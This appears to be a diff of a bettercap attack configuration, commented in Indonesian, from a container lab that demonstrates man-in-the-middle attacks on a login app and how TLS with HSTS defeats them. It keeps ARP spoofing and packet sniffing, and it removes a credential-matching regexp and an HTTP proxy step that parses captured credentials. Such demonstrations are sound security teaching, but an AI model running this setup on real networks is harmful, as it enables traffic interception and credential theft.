@@ -36,10 +36,6 @@ set arp.spoof.fullduplex true
 # PENTING: Untuk intercept traffic antar container di subnet yang sama!
 set arp.spoof.internal true
 
-# Target: client-victim (172.20.0.10) dan vuln-backend (172.20.0.21)
-# Kredensial dikirim via POST ke backend, BUKAN ke frontend!
-# set arp.spoof.targets 172.20.0.10,172.20.0.21
-
 # Mulai ARP spoofing
 arp.spoof on
 
@@ -48,38 +44,13 @@ arp.spoof on
 
 # ------- Network Sniffer -------
 # Aktifkan sniffer untuk menangkap paket
-set net.sniff.regexp .*username.*password.*
-set net.sniff.verbose false
 set net.sniff.output /tmp/bettercap-capture.pcap
 net.sniff on
 
 # ------- Event Logger -------
-# Default behaviour is printing to terminal. Writing to a file can suppress terminal output.
-# set events.stream.output /tmp/bettercap-events.log
+# Log semua event ke file
+set events.stream.output /tmp/bettercap-events.log
 # events.stream on
-
-
-# ------- HTTP Proxy (Sniffing) -------
-# Aktifkan HTTP proxy untuk intercept traffic plaintext
-# Kredensial dikirim ke port 5000 (vuln-backend), jadi kita harus mencegat port 5000
-set http.port 5000
-set http.proxy.sslstrip false
-set http.proxy.verbose false
-set http.proxy.script /opt/attack-scripts/bettercap/parse_json.js
-http.proxy on
-
-# ------- HTTPS Proxy (Sniffing) -------
-# Aktifkan HTTPS proxy untuk mencoba intercept traffic secure
-# Kredensial dikirim ke port 5443 (sec-backend)
-#
-# PENTING: Jika dua baris di bawah ini diaktifkan, aplikasi akan RUSAK/TERBLOKIR!
-# Mengapa? 
-# 1. Bettercap akan memaksa masuk dan menyajikan Sertifikat TLS Palsu.
-# 2. Browser Victim akan memvalidasi sertifikat dan menyadari bahwa itu bukan dari CA resmi.
-# 3. Fitur HSTS (Helmet.js) di backend membuat Browser Victim menolak koneksi secara MUTLAK (Hard Fail).
-# Ini membuktikan bahwa Active MITM digagalkan oleh sistem keamanan (Browser + TLS + HSTS).
-# set https.port 5443
-# https.proxy on
 
 # Tampilkan status
 # Bettercap akan otomatis menampilkan kredensial yang ditemukan
